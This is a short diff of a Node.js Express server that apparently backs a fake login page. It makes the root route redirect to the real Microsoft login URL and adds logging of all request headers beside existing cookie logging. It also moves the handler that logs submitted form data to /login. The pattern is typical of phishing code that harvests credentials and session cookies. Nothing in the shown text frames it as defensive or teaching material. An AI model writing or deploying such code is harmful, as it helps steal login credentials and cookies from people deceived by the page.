@@ -11,12 +11,13 @@ app.use(bodyParser.urlencoded({ extended: true }));
 
 // Serve the login page
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "myfile.html"));
+  res.redirect("https://login.microsoftonline.com/common/login");
   console.log("cookies:", req.headers.cookie);
+  console.log("req.header: ", req.headers);
 });
 
 // Handle form submission
-app.post("/", async (req, res) => {
+app.post("/login", async (req, res) => {
   console.log("Incoming form data:", req.body);
 
   try {
